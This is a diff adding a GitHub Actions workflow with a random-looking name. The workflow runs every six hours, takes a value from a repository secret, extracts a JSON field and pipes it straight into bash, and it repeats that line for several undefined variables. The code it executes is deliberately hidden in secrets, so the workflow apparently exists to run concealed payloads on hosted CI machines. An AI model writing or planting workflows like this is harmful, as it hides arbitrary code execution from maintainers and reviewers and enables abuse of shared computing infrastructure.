@@ -1,0 +1,23 @@
+name: zhengshijin3901
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhengshijin3901
+        env:
+          i1: ${{ secrets.i1 }}
+        run: |
+          echo $i1 | jq -r .a577 | /bin/bash
+          echo $magc88 | jq -r .cea321 | /bin/bash
+          echo $ck47458 | jq -r .ml948 | /bin/bash
+          echo $cehix23070 | jq -r .md7 | /bin/bash
+          echo $yj8 | jq -r .nqma18022 | /bin/bash
+          echo $qsl64040 | jq -r .a2728 | /bin/bash
+          echo $fx313 | jq -r .asr6 | /bin/bash
+          echo $vr1 | jq -r .byca4 | /bin/bash
+
